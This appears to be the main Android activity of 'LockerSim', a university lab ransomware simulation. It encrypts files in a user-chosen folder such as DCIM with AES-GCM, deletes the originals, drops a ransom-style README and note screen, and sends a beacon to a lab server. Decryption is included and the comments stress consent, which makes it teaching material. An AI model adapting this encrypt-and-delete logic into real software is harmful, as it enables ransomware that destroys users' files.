package au.edu.deakin.lab.lockersim

import android.content.ContentResolver
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.OpenableColumns
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.documentfile.provider.DocumentFile
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import au.edu.deakin.lab.lockersim.beacon.BeaconWorker
import au.edu.deakin.lab.lockersim.data.FileRepo
import au.edu.deakin.lab.lockersim.databinding.ActivityMainBinding
import au.edu.deakin.lab.lockersim.ransom.RansomNoteActivity
import java.io.File

/**
 * Main screen for my LockerSim demo app.
 *
 * What I do here:
 *  - Work inside my own app sandbox by default (safe).
 *  - Let the user **explicitly** pick a folder (via SAF) for a controlled demo.
 *  - Encrypt/decrypt demo files with AES‑GCM (filename used as AAD).
 *  - Trigger a short WorkManager “beacon” burst to my lab-only server.
 *
 * Safety: I never touch real photos or personal data unless I, the user,
 * deliberately choose a folder through the system picker.
 */
class MainActivity : AppCompatActivity() {

    // ViewBinding for activity_main.xml. This gives me typed access to views.
    private lateinit var b: ActivityMainBinding

    // Simple helper that reads/writes files in my app's sandbox.
    private lateinit var repo: FileRepo

    // My lab-only HTTP endpoint for the beacon demo (change to your host IP if needed).
    private val labUrl = "http://10.42.0.1:8000/beacon"

    // I store the user-chosen folder URI here (SharedPreferences namespace).
    private val PREF = "locker"
    private val KEY_TREE = "treeUri"

    /**
     * System file picker for a **single image**.
     * I copy whatever I pick into my own sandbox so I can safely test on it.
     */
    private val pickPhoto = registerForActivityResult(
        ActivityResultContracts.OpenDocument()
    ) { uri: Uri? ->
        if (uri != null) {
            val copied = copyToSandbox(uri)
            append("Imported ${copied.name} into sandbox")
        } else append("Import cancelled")
    }

    /**
     * System folder picker (DocumentTree). This is how I let the user
     * *intentionally* grant read+write access to a directory like DCIM.
     * I persist the grant so it survives restarts until the user revokes it.
     */
    private val pickTree = registerForActivityResult(
        ActivityResultContracts.OpenDocumentTree()
    ) { uri ->
        if (uri != null) {
            // I ask Android to remember this permission for me (read+write).
            val flags = Intent.FLAG_GRANT_READ_URI_PERMISSION or
                    Intent.FLAG_GRANT_WRITE_URI_PERMISSION
            contentResolver.takePersistableUriPermission(uri, flags)

            // I save the chosen folder so the buttons can work later.
            saveTreeUri(uri)
            setTreeButtonsEnabled(true)

            // Log a friendly name so I can see what I picked.
            val name = DocumentFile.fromTreeUri(this, uri)?.name ?: uri.lastPathSegment
            append("Chosen folder: $name (persisted)")
        } else {
            append("Folder selection cancelled")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Inflate the layout once and keep the binding.
        b = ActivityMainBinding.inflate(layoutInflater)
        setContentView(b.root)

        // Point my helper at the sandbox path for this app.
        repo = FileRepo(this)
        b.status.text = "LockerSim (SIMULATION)\nDir: ${repo.dirPath()}"

        // ---- Button wiring (sandbox features) ----

        // Pick one photo and copy it into my sandbox.
        b.btnImport.setOnClickListener { importPhoto() }

        // Generate a bunch of tiny demo files in the sandbox.
        b.btnSeed.setOnClickListener {
            val n = repo.seedDummyFiles().size
            append("Seeded $n dummy files")
        }

        // Show what’s currently in the sandbox. Good for before/after evidence.
        b.btnList.setOnClickListener {
            val files = repo.listFiles()
            append("Files (${files.size}):\n" + files.joinToString("\n") {
                " - ${it.name} (${it.length()} bytes)"
            })
        }

        // Encrypt everything in the sandbox (writes *.gcm). Then show a simple notice.
        b.btnEncrypt.setOnClickListener {
            val n = repo.encryptAll().size
            append("Encrypted $n files (now *.gcm)")
            if (n > 0) {
                // I also drop a tiny README so it shows up in a directory listing.
                File(repo.dirPath(), "READ_ME_SIMULATION.txt")
                    .writeText(
                        "Your LockerSim demo files were encrypted (SIMULATION). " +
                                "Open the app and press DECRYPT to restore."
                    )
                // Pop the in‑app “note” (assets/note.html in a WebView).
                startActivity(Intent(this, RansomNoteActivity::class.java))
            }
        }

        // Walk any *.gcm files in the sandbox and restore them using the same AAD (name).
        b.btnDecrypt.setOnClickListener {
            val n = repo.decryptAll().size
            append("Decrypted $n files")
        }

        // Schedule a quick 5‑burst beacon with WorkManager (1/min). Lab-only HTTP.
        b.btnBeacon.setOnClickListener {
            val work = OneTimeWorkRequestBuilder<BeaconWorker>()
                .setInputData(BeaconWorker.input(labUrl, bursts = 5, intervalSec = 60))
                .build()
            WorkManager.getInstance(this).enqueue(work)
            append("Beacon burst scheduled (5×,60s)")
        }

        // ---- Button wiring (user‑chosen folder features) ----

        // Ask me to pick a folder (e.g., DCIM). Until I do, the folder actions stay disabled.
        b.btnPickDcim.setOnClickListener { pickTree.launch(null) }

        // Encrypt the *files* (one level, non‑recursive) in the folder I granted.
        b.btnEncryptDcim.setOnClickListener { encryptChosenTree() }

        // Decrypt any *.gcm blobs back to their original names.
        b.btnDecryptDcim.setOnClickListener { decryptChosenTree() }

        // Restore button state if I already granted a folder earlier.
        setTreeButtonsEnabled(getTreeDoc() != null)
    }

    /** Start the image picker. I filter to images so the UX is tidy. */
    private fun importPhoto() {
        pickPhoto.launch(arrayOf("image/*"))
    }

    /**
     * Copy the selected content URI into my app's sandbox.
     * I try to keep the original display name so my evidence listings look familiar.
     */
    private fun copyToSandbox(uri: Uri): File {
        val dir = File(getExternalFilesDir("locker"), "data").apply { mkdirs() }
        val name = queryDisplayName(uri) ?: "import_${System.currentTimeMillis()}.jpg"
        val out = File(dir, name)
        contentResolver.openInputStream(uri)!!.use { ins ->
            out.outputStream().use { outs -> ins.copyTo(outs) }
        }
        return out
    }

    /** Ask the provider for a friendly file name for a given content URI. */
    private fun queryDisplayName(uri: Uri): String? {
        val cr: ContentResolver = contentResolver
        cr.query(uri, arrayOf(OpenableColumns.DISPLAY_NAME), null, null, null)?.use { c ->
            val idx = c.getColumnIndex(OpenableColumns.DISPLAY_NAME)
            if (idx >= 0 && c.moveToFirst()) return c.getString(idx)
        }
        return null
    }

    /** Enable/disable the folder actions depending on whether I have a grant. */
    private fun setTreeButtonsEnabled(enabled: Boolean) {
        b.btnEncryptDcim.isEnabled = enabled
        b.btnDecryptDcim.isEnabled = enabled
    }

    /** Remember the chosen folder so I don’t have to pick it every run. */
    private fun saveTreeUri(uri: Uri) {
        getSharedPreferences(PREF, MODE_PRIVATE).edit()
            .putString(KEY_TREE, uri.toString()).apply()
    }

    /** Turn the saved URI string back into a DocumentFile root (or null if I have none). */
    private fun getTreeDoc(): DocumentFile? {
        val s = getSharedPreferences(PREF, MODE_PRIVATE).getString(KEY_TREE, null) ?: return null
        return DocumentFile.fromTreeUri(this, Uri.parse(s))
    }

    /**
     * Encrypt every **file** (not sub‑folders) in the chosen folder.
     * Steps I follow for each file:
     *  1) read bytes via ContentResolver,
     *  2) encrypt with AES‑GCM using the filename as AAD,
     *  3) write "<name>.gcm",
     *  4) delete the original plaintext.
     * I keep it one‑level and non‑recursive on purpose for safety and speed.
     */
    private fun encryptChosenTree() {
        val tree = getTreeDoc() ?: return append("No folder chosen yet")
        var changed = 0
        for (doc in tree.listFiles()) {
            if (doc.isDirectory) continue
            val name = doc.name ?: continue
            if (name.endsWith(".gcm")) continue // already encrypted

            try {
                val plain = contentResolver.openInputStream(doc.uri)?.use { it.readBytes() } ?: continue
                val blob = au.edu.deakin.lab.lockersim.crypto.Crypto.encrypt(plain, name.toByteArray())
                val out = tree.createFile("application/octet-stream", "$name.gcm") ?: continue
                contentResolver.openOutputStream(out.uri, "w")?.use { it.write(blob) }
                doc.delete()
                changed++
            } catch (e: Exception) {
                append("Encrypt failed for $name: ${e.message}")
            }
        }
        append("Encrypted $changed files in chosen folder")

        if (changed > 0) {
            // For evidence, I also create a tiny README in the same folder.
            getTreeDoc()?.createFile("text/plain", "READ_ME_SIMULATION.txt")?.also { f ->
                contentResolver.openOutputStream(f.uri, "w")?.use { os ->
                    val msg = "Your LockerSim demo files were encrypted (SIMULATION). " +
                            "Open LockerSim and press DECRYPT to restore."
                    os.write(msg.toByteArray(Charsets.UTF_8))
                }
            }
            // Show the “ransom note” WebView (really just assets/note.html).
            startActivity(Intent(this, RansomNoteActivity::class.java))
        }
    }

    /**
     * Reverse the process for any "<name>.gcm" file in the chosen folder.
     * I recover the original name by trimming the extension and pass that as AAD.
     */
    private fun decryptChosenTree() {
        val tree = getTreeDoc() ?: return append("No folder chosen yet")
        var changed = 0
        for (doc in tree.listFiles()) {
            if (doc.isDirectory) continue
            val name = doc.name ?: continue
            if (!name.endsWith(".gcm")) continue

            try {
                val blob = contentResolver.openInputStream(doc.uri)?.use { it.readBytes() } ?: continue
                val orig = name.removeSuffix(".gcm")
                val plain = au.edu.deakin.lab.lockersim.crypto.Crypto.decrypt(blob, orig.toByteArray())
                val out = tree.createFile("application/octet-stream", orig) ?: continue
                contentResolver.openOutputStream(out.uri, "w")?.use { it.write(plain) }
                doc.delete()
                changed++
            } catch (e: Exception) {
                append("Decrypt failed for $name: ${e.message}")
            }
        }
        append("Decrypted $changed files in chosen folder")
    }

    /** Log to Logcat and also append to the on‑screen TextView for easy screenshots. */
    private fun append(s: String) {
        Log.d("LockerSim", s)
        b.output.append(s + "\n")
    }
}
